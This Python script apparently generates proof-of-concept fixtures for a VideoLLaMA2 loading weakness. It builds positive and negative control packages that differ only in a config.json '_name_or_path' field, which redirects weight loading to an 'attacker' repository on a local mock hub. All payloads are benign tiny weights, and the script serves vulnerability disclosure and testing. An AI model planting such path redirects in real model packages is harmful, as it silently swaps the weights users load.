"""Generate the two VideoLLaMA2 model packages (positive / negative control) and
the two second-hop Hub repositories served by the local mock hub.

Main package (what the victim selects / is handed) -- the two arms are
byte-identical except for the `_name_or_path` value inside config.json:
    work/pkg_attacker/config.json        _name_or_path = "attacker/videollama2-base"
    work/pkg_victim/config.json          _name_or_path = "victim/videollama2-approved"
    work/pkg_*/mm_projector.bin          benign pretraining-checkpoint side artifact
Second-hop repos (data only: JSON + tokenizer data + safetensors, no .py,
no pickle, no native libraries):
    work/hub/attacker/videollama2-base/   {config.json, generation_config.json,
                                           tokenizer_config.json, tokenizer.json,
                                           special_tokens_map.json, model.safetensors}
    work/hub/victim/videollama2-approved/ same shape

mm_projector.bin is the benign side artifact every VideoLLaMA2 pretraining
checkpoint ships (tune_mm_mlp_adapter=True checkpoints save it); without it the
pretraining branch raises while resolving the projector before it reaches the
end of load_pretrained_model. It is byte-identical across the two arms.

The `videollama2` import registers the `videollama2_mistral` AutoConfig class and
gives us the real model class, so the shipped model.safetensors files carry the
exact key set that Videollama2MistralForCausalLM.from_pretrained expects (tiny
dimensions, two different fixed seeds, so each arm's weights are distinguishable).
"""
import hashlib
import json
import os
import shutil
import sys

import torch
from safetensors.torch import save_file

HERE = os.path.dirname(os.path.abspath(__file__))
SRC = os.path.join(HERE, "VideoLLaMA2-c0bb03abf6b8")
WORK = os.path.join(HERE, "work")
sys.path.insert(0, SRC)

ATTACKER_REPO = "attacker/videollama2-base"
VICTIM_REPO = "victim/videollama2-approved"

# tiny-but-valid Mistral dims so the fixture loads fast on CPU
TINY = dict(
    hidden_size=64, intermediate_size=128, num_hidden_layers=2,
    num_attention_heads=4, num_key_value_heads=2, head_dim=16,
    vocab_size=512, max_position_embeddings=512,
    bos_token_id=1, eos_token_id=2, pad_token_id=2,
)


def build_second_repo(repo_dir, seed):
    """A data-only LLM repository: config + tokenizer files + tiny safetensors."""
    from transformers import PreTrainedTokenizerFast
    from tokenizers import Tokenizer
    from tokenizers.models import WordLevel
    from tokenizers.pre_tokenizers import Whitespace
    from videollama2.model import Videollama2MistralConfig, Videollama2MistralForCausalLM

    os.makedirs(repo_dir, exist_ok=True)

    with open(os.path.join(repo_dir, "config.json"), "w", encoding="utf-8") as f:
        json.dump({"model_type": "mistral", "architectures": ["MistralForCausalLM"], **TINY},
                  f, indent=2)
    with open(os.path.join(repo_dir, "generation_config.json"), "w", encoding="utf-8") as f:
        json.dump({"bos_token_id": 1, "eos_token_id": 2, "pad_token_id": 2}, f, indent=2)

    tok = Tokenizer(WordLevel(
        vocab={"<unk>": 0, "<s>": 1, "</s>": 2, "hello": 3, "world": 4}, unk_token="<unk>"))
    tok.pre_tokenizer = Whitespace()
    fast = PreTrainedTokenizerFast(
        tokenizer_object=tok, unk_token="<unk>", bos_token="<s>", eos_token="</s>",
        pad_token="</s>", model_max_length=512)
    fast.save_pretrained(repo_dir)  # tokenizer_config.json + special_tokens_map.json + tokenizer.json

    torch.manual_seed(seed)
    model = Videollama2MistralForCausalLM(Videollama2MistralConfig(**TINY))
    sd = {k: v.half().contiguous() for k, v in model.state_dict().items()}
    save_file(sd, os.path.join(repo_dir, "model.safetensors"), metadata={"format": "pt"})
    return sd["model.embed_tokens.weight"].float().mean().item()


def write_pkg(pkg_dir, name_or_path):
    """Writer-generated main package; identical across arms except _name_or_path."""
    os.makedirs(pkg_dir, exist_ok=True)
    cfg = {
        "_name_or_path": name_or_path,
        "architectures": ["Videollama2MistralForCausalLM"],
        "model_type": "videollama2_mistral",
        "tune_mm_mlp_adapter": True,        # drives the pretraining branch of load_pretrained_model
        "torch_dtype": "float16",
        **TINY,
    }
    with open(os.path.join(pkg_dir, "config.json"), "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2)

    torch.manual_seed(7)
    proj = {"mm_projector.weight": torch.randn(64, 32).half(),
            "mm_projector.bias": torch.randn(64).half()}
    torch.save(proj, os.path.join(pkg_dir, "mm_projector.bin"))


def write_sha256sums():
    lines = []
    for root, _dirs, files in os.walk(WORK):
        for fn in sorted(files):
            p = os.path.join(root, fn)
            rel = os.path.relpath(p, WORK).replace("\\", "/")
            with open(p, "rb") as f:
                lines.append("%s  %s" % (hashlib.sha256(f.read()).hexdigest(), rel))
    with open(os.path.join(WORK, "SHA256SUMS.txt"), "w", encoding="utf-8") as f:
        f.write("\n".join(sorted(lines, key=lambda l: l.split("  ", 1)[1])) + "\n")


def main():
    if os.path.isdir(WORK):
        shutil.rmtree(WORK)
    os.makedirs(WORK, exist_ok=True)

    # import videollama2 to register the videollama2_mistral config/model classes
    import videollama2  # noqa: F401
    from videollama2.model import Videollama2MistralForCausalLM  # noqa: F401

    m_att = build_second_repo(os.path.join(WORK, "hub", *ATTACKER_REPO.split("/")), seed=1234)
    m_vic = build_second_repo(os.path.join(WORK, "hub", *VICTIM_REPO.split("/")), seed=4321)
    write_pkg(os.path.join(WORK, "pkg_attacker"), ATTACKER_REPO)
    write_pkg(os.path.join(WORK, "pkg_victim"), VICTIM_REPO)
    write_sha256sums()

    print("[make-poc] generated packages under %s" % WORK)
    print("[make-poc]   pkg_attacker/config.json _name_or_path = %r" % ATTACKER_REPO)
    print("[make-poc]   pkg_victim/config.json   _name_or_path = %r" % VICTIM_REPO)
    print("[make-poc] second-hop repos (data only) under work/hub/:")
    print("[make-poc]   %s  embed_tokens mean = %.6f" % (ATTACKER_REPO, m_att))
    print("[make-poc]   %s  embed_tokens mean = %.6f" % (VICTIM_REPO, m_vic))
    print("[make-poc] SHA256SUMS.txt written (%d files)" % (
        len(open(os.path.join(WORK, "SHA256SUMS.txt"), encoding="utf-8").read().splitlines())))


if __name__ == "__main__":
    main()
